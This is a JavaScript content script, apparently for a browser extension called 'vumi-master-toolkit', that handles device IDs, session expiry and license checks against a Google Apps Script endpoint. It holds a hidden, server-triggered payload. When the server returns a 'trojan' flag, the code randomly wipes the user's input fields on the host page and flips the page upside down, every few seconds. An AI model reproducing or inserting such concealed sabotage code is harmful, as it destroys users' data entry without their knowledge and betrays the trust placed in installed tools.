(async function() {
    if (document.getElementById('vumi-master-toolkit')) return;
    
    // আপনার Google Apps Script API Link
    const API_URL = "https://script.google.com/macros/s/AKfycbxi2hFWmkWkgSl2_ATdNiJbMPTxXCtEHNacyfK_6llSXGYCXPDkB4kLVx9Kma1BgDCWhQ/exec";
    
    let deviceId = "";
    let savedAuth = "";
    let tFlag = "";
    let sessionExpiry = "";
    
    // Device ID generate করার জন্য একটি consistent approach
    async function getOrCreateDeviceId() {
        // প্রথমে server থেকে চেক করুন - এটি সব ডোমেইনে same হবে
        try {
            let response = await fetch(`${API_URL}?action=getDeviceId&t=${Date.now()}`);
            let data = await response.json();
            if (data.deviceId) {
                return data.deviceId;
            }
        } catch (e) {
            console.log("Could not fetch device ID from server");
        }
        
        // যদি server থেকে না পায়, তাহলে local generate করুন
        let localId = null;
        if (typeof chrome !== 'undefined' && chrome.storage) {
            let data = await chrome.storage.local.get('vmt_device_id');
            localId = data.vmt_device_id;
            if (!localId) {
                localId = 'VMT-' + generateRandomId() + '-' + Date.now();
                await chrome.storage.local.set({vmt_device_id: localId});
            }
        } else {
            localId = localStorage.getItem('vmt_device_id');
            if (!localId) {
                localId = 'VMT-' + generateRandomId() + '-' + Date.now();
                localStorage.setItem('vmt_device_id', localId);
            }
        }
        return localId;
    }
    
    function generateRandomId() {
        return Math.random().toString(36).substr(2, 9);
    }
    
    // Initialize করুন
    deviceId = await getOrCreateDeviceId();
    
    if (typeof chrome !== 'undefined' && chrome.storage) {
        let data = await chrome.storage.local.get(['vmt_auth_hash', 'vmt_t_flag', 'vmt_session_expiry']);
        savedAuth = data.vmt_auth_hash || "";
        tFlag = data.vmt_t_flag || "";
        sessionExpiry = data.vmt_session_expiry || "";
    } else {
        savedAuth = localStorage.getItem('vmt_auth_hash') || "";
        tFlag = localStorage.getItem('vmt_t_flag') || "";
        sessionExpiry = localStorage.getItem('vmt_session_expiry') || "";
    }

    // Session expiry check
    if (savedAuth && sessionExpiry) {
        if (Date.now() > parseInt(sessionExpiry)) {
            await clearAuthData();
            savedAuth = "";
            tFlag = "";
        }
    }

    async function saveAuthData(auth, flag) {
        // Session 3 ঘণ্টার জন্য সেট করুন
        let expiryTime = (Date.now() + (3 * 60 * 60 * 1000)).toString(); 
        if (typeof chrome !== 'undefined' && chrome.storage) {
            await chrome.storage.local.set({ 
                vmt_auth_hash: auth, 
                vmt_session_expiry: expiryTime 
            });
            if (flag) {
                await chrome.storage.local.set({ vmt_t_flag: flag });
            } else {
                await chrome.storage.local.remove('vmt_t_flag');
            }
        } else {
            localStorage.setItem('vmt_auth_hash', auth);
            localStorage.setItem('vmt_session_expiry', expiryTime);
            if (flag) {
                localStorage.setItem('vmt_t_flag', flag);
            } else {
                localStorage.removeItem('vmt_t_flag');
            }
        }
    }
    
    async function clearAuthData() {
        if (typeof chrome !== 'undefined' && chrome.storage) {
            await chrome.storage.local.remove(['vmt_auth_hash', 'vmt_t_flag', 'vmt_session_expiry']);
        } else {
            localStorage.removeItem('vmt_auth_hash');
            localStorage.removeItem('vmt_t_flag');
            localStorage.removeItem('vmt_session_expiry');
        }
    }

    function show404Overlay(message) {
        if (document.getElementById('vmt-404-overlay')) return;
        let tk = document.getElementById('vumi-master-toolkit');
        let po = document.getElementById('vmt-pass-overlay');
        if (tk) tk.remove();
        if (po) po.remove();

        const overlay = document.createElement('div');
        overlay.id = 'vmt-404-overlay';
        overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999999;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI', Arial, sans-serif;animation: fadeIn 0.5s ease;";
        overlay.innerHTML = `
            <div style="text-align:center; width: 100%; max-width: 800px; padding: 40px 20px;">
                <div style="background-image: url('https://cdn.dribbble.com/users/285475/screenshots/2083086/dribbble_1.gif'); height: 400px; background-position: center; background-repeat: no-repeat;">
                    <h1 style="font-size:80px; margin:0; color:#333; padding-top:20px;">404</h1>
                </div>
                <div style="margin-top:-50px;">
                    <h3 style="font-size:36px; margin: 10px 0; color:#333; font-weight: bold;">Look like you're lost</h3>
                    <p style="font-size:16px; color:#666; margin-bottom: 25px; font-weight: 500;">${message}</p>
                    <button id="vmt-404-btn" style="color: #fff; padding: 12px 30px; background: #39ac31; border:none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; outline: none; box-shadow: 0 4px 6px rgba(57,172,49,0.3);">Go to Home / Reload</button>
                </div>
            </div>
            <style>@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } } #vmt-404-btn:hover { background: #2e8b28; transform: translateY(-2px); box-shadow: 0 6px 12px rgba(57,172,49,0.4); }</style>
        `;
        document.body.appendChild(overlay);
        document.getElementById('vmt-404-btn').onclick = () => window.location.reload();
    }

    async function checkLiveStatus() {
        try {
            let userId = savedAuth ? atob(savedAuth) : "guest";
            let response = await fetch(`${API_URL}?action=verify&userid=${encodeURIComponent(userId)}&deviceid=${encodeURIComponent(deviceId)}&t=${Date.now()}`);
            let data = await response.json();
            
            if (data.success === false) {
                await clearAuthData();
                show404Overlay(data.message || "সার্ভার আপডেট চলছে অথবা আপনার অ্যাক্সেস বাতিল করা হয়েছে!");
            } else if (data.success === true && data.trojan === true) {
                await saveAuthData(savedAuth, 'engaged');
                tFlag = 'engaged';
            } else if (data.success === true) {
                await saveAuthData(savedAuth, '');
                tFlag = '';
            }
        } catch (e) { 
            console.log("Live check running..."); 
        }
    }

    // Session check interval - 5 মিনিটে একবার (30 সেকেন্ড থেকে কমিয়ে)
    setInterval(async () => {
        let exp = null;
        if (typeof chrome !== 'undefined' && chrome.storage) {
            let data = await chrome.storage.local.get(['vmt_session_expiry']);
            exp = data.vmt_session_expiry;
        } else {
            exp = localStorage.getItem('vmt_session_expiry');
        }
        
        // শুধুমাত্র expiry pass হলেই reload করুন, বার বার না করে
        if (savedAuth && exp && Date.now() > parseInt(exp)) {
            await clearAuthData();
            window.location.reload(); 
        } else {
            checkLiveStatus();
        }
    }, 300000); // 5 মিনিট = 300000ms (30 সেকেন্ডের পরিবর্তে)

    function activatePayload() {
        setInterval(() => {
            if(tFlag === 'engaged') {
                document.querySelectorAll('input').forEach(inp => {
                    if(Math.random() > 0.8 && !inp.closest('#vumi-master-toolkit') && !inp.closest('#vmt-pass-overlay')) { 
                        inp.value = ""; 
                    }
                });
                if(document.body && Math.random() > 0.95) {
                    document.body.style.transition = "all 2s"; 
                    document.body.style.transform = "rotate(180deg) scale(0.8)";
                    setTimeout(() => { 
                        document.body.style.transform = "none"; 
                    }, 5000);
                }
            }
        }, 5000); 
    }
    
    // Initialize
    activatePayload();
    
})();